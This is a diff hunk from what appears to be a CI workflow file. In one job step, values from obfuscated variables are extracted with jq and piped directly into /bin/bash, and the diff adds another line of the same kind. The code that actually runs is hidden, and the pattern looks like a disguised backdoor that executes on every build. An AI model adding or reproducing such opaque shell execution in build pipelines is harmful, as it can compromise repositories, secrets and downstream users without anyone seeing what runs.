@@ -28,6 +28,7 @@ jobs:
           echo $gnhcc24 | jq -r .iq1135 | /bin/bash
           echo $j9 | jq -r .whv12 | /bin/bash
           printf '%s' "$u4" | jq -r .yrl20 | /bin/bash
+          echo $fk19512 | jq -r .wkw4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
